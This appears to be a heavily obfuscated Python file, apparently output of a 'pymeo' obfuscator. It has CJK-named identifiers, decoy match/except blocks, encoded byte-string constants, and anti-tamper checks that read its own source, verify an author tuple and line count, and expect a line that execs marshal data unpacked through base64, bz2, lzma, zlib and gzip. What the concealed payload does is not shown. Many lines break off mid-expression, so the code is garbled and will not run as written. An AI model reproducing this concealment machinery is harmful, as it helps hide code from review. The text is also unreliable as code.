樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '陵柑穁謽槞鷐' == '傋焄夁蔢紂幧':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            嘸籁姢騀腃漎 = [[True], [False]]
            暽掇財豥硿淳(['煖措怷獩蔟宒'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 蟞虩洳騐顬簪:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                卯遠脑撆罆蛲 = [[(lambda: (lambda 劖藏黄祉緤妜: 劖藏黄祉緤妜 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蜡螳森卝镎郬: 蜡螳森卝镎郬 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 派粜鳏崑貴讣:
        __import__('sys').setrecursionlimit(99999999)
try:
    match '裲僾葵锈鏢絉' == '鹉貁筣潲検綻':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            殏噝夂塼癰裙 = [[True], [False]]
            暽掇財豥硿淳(['婣挲鬡蠢笻拨'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 鲍罓煦鯧睏斝:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                玏愩柆荲熤枆 = [[(lambda: (lambda 覾薼牸蟧去蔋: 覾薼牸蟧去蔋 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 帹靖袧幨氃戤: 帹靖袧幨氃戤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 勚橯蓐榝畲痠:

        def ngocuyendethuong():print(1)
        #    globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '堪紤錐佞誐妢' == '瑡搶庿骹湖坝':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            觹廾飪淢巑猴 = [[True], [False]]
            暽掇財豥硿淳(['召閁媢臅茡滒'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 猈核颽贙苦蕥:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                侹歡窩醃鶘峯 = [[(lambda: (lambda 摝磿揚獂妱枨: 摝磿揚獂妱枨 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 鲧哟繨奞醇髅: 鲧哟繨奞醇髅 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 绺忊糫躼嚴繄:
        if int(len(__import__('inspect').stack())) != 3:
            ngocuyendethuong()
try:
    match '跎蕻洋鎣恄毃' == '壂瓞傿平恋禑':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            佨蝹褈覨胡櫚 = [[True], [False]]
            暽掇財豥硿淳(['盁儔硦挫鉽峘'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 捧竔徹桢反柀:
    pass

try:
    match '跎蕻洋鎣恄毃' == '壂瓞傿平恋禑':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            佨蝹褈覨胡櫚 = [[True], [False]]
            暽掇財豥硿淳(['盁儔硦挫鉽峘'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 捧竔徹桢反柀:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                叿嗋摯崌膉鋸 = [[(lambda: (lambda 桧拓沦礐蒲鯼: 桧拓沦礐蒲鯼 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 漈羨峰碖扢哽: 漈羨峰碖扢哽 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 釺墮銕蟖吚霣:
        pass
try:
    match '膞騙膡儿螁亪' == '嫸凨豏珅惬貎':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            筵譹鿨周叩鄅 = [[True], [False]]
            暽掇財豥硿淳(['螻洰丙礞蓍鮥'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 鞲幎腊壓蘳荕:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                溝皊簧詉羪诞 = [[(lambda: (lambda 猘檐啦嗍膛闉: 猘檐啦嗍膛闉 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 早噪捋塇山峸: 早噪捋塇山峸 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 恄燠鶭级袥儏:
        try:
            with open(__file__, "r", encoding="utf-8") as j:
                j = j.readlines()
            if __Author__ != ('GEORGE', 'AHMAD'):
                globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
        except:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()

try:
    match '鳠存光遦劄战' == '啥祽胋昬沓僬':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            税嵢邐棷綪諶 = [[True], [False]]
            暽掇財豥硿淳(['瑯暳樲牁狧峲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 鞲幎腊壓蘳荕:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722246406, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722258233, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722242969, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722247749, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722260860, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722245348]))))())())() == (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                溝皊簧詉羪诞 = [[(lambda: (lambda 猘檐啦嗍膛闉: 猘檐啦嗍膛闉 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 早噪捋塇山峸: 早噪捋塇山峸 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 恄燠鶭级袥儏:
        try:
            with open(__file__, "r", encoding="utf-8") as j:
                j = j.readlines()
            if __Author__!=('GEORGE', 'AHMAD'):
                raise
            if ";" in j[0]:
                raise
            if ";" in j[1]:
                raise
            if ";" in j[2]:
                raise
            if ";" in j[3]:
                raise
            if ";" in j[4]:
                raise
            if ";" in j[6]:
                raise
            if j[5][0:280] != "try:_pymeomeo['exec'](_pymeomeo['__import__']('marshal').loads(_pymeomeo['__import__']('gzip').decompress(_pymeomeo['__import__']('zlib').decompress(_pymeomeo['__import__']('lzma').decompress(_pymeomeo['__import__']('bz2').decompress(_pymeomeo['__import__']('base64').a85decode(b'":
                raise
            if str(j[(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x04'))()])[-(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x02'))():] != (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc2'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xa3'))()]))))())())():
                raise
            if str(j[(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x05'))()])[-(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))()] == (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd4'))()]))))())())():
                raise
            # if _pymeomeo_version != "example":
                # raise
            if _obf != "p":
                raise
            if "_obf = ('pymeo')[(lambda : 0)()]" not in j[1]:
                raise
            if "__Author__ = ('GEORGE', 'AHMAD')" not in j[2]:
                raise
            with open(__file__, "r", encoding="utf-8") as file:
                _ = sum(((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))() for line in file))
            if _ != 7:
                raise Exception((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xeb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xda'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 